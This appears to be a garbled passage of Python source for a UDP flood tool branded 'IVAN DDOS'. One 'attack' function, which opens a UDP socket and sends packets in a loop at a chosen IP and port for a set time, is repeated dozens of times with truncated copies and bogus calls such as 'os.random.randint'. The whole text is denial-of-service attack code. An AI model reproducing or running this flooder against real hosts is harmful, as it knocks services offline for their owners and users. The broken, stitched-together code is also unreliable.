    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
